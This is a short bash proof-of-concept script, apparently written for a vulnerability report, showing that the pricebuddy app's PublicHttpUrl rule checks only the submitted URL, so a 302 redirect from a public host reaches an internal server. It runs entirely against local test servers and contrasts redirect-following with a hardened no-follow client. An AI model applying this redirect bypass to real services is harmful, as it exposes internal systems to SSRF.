#!/bin/bash
# PoC for pricebuddy authenticated SSRF via redirect bypass of the PublicHttpUrl rule.
# Part 1: the REAL PublicHttpUrl rule passes a public host, blocks internal ones,
#         and only ever inspects the INITIAL url (no redirect awareness).
# Part 2: the scraper fetch (Laravel Http/Guzzle default) follows a 302 to an
#         internal host and returns its body; a hardened (no-follow) client does not.
# Usage: ./pricebuddy-ssrf-redirect-poc.sh /path/to/pricebuddy/app/Rules/PublicHttpUrl.php
set -u
RULE="${1:?usage: $0 /path/to/app/Rules/PublicHttpUrl.php}"
HERE="$(cd "$(dirname "$0")" && pwd)"
echo "=== Part 1: real PublicHttpUrl verdicts ==="
php "$HERE/pricebuddy-validator-test.php" "$RULE"
echo
php -S 127.0.0.1:9000 "$HERE/pricebuddy-internal.php"  >/dev/null 2>&1 & I=$!
php -S 127.0.0.1:9100 "$HERE/pricebuddy-redirector.php" >/dev/null 2>&1 & R=$!
sleep 1
echo "=== Part 2: submitted url = attacker's PUBLIC host (passes validator); it 302s to an internal target ==="
echo "-- fetch following redirects (Laravel Http/Guzzle default, scraper does NOT disable it):"
curl -sL -A "web-scraper-for-laravel" "http://127.0.0.1:9100/"; echo
echo "-- same fetch WITHOUT following redirects (hardened client):"
curl -s -o /dev/null -w "   status=%{http_code} (no body leaked)\n" "http://127.0.0.1:9100/"
kill $I $R 2>/dev/null
echo "---done---"
